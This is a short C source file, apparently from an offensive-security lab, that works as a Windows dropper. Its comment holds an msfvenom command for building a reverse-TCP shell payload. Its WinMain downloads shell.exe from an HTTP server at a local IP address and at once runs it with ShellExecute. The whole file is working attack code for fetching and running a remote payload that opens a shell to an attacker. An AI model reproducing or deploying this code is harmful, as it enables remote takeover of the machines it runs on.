#include <windows.h>
#include <urlmon.h>
#pragma comment(lib, "urlmon.lib")

/*msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.86.40 LPORT=3534 --arch x64 -f exe > shell.exe*/
/*
 Compilalo con: x86_64-w64-mingw32-gcc -o download_and_execute.exe download_and_execute_malware_from_remote_server.c -lurlmon
*/

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE
hPrevInstance,
LPSTR lpCmdLine, int nCmdShow)
{
    URLDownloadToFile(NULL,
        "http://192.168.86.40:8000/shell.exe",
        "C:\\temp\\malware.exe", 0, NULL);
        ShellExecute(NULL, "open", "C:\\temp\\malware.exe", NULL,
        NULL, SW_SHOWNORMAL);
    return 0;
}